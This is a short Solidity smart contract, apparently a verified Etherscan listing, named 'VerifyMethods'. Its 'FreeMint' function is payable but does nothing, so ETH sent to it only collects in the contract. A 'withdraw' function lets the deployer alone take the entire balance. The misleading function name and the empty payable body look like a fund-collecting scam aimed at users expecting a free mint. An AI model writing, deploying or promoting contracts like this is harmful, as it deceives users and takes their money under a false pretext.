/**
 *Submitted for verification at Etherscan.io on 2023-03-07
*/

// SPDX-License-Identifier: None
pragma solidity ^0.8.0;

contract VerifyMethods {

    address private owner;

    constructor() {   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public payable {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function FreeMint() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}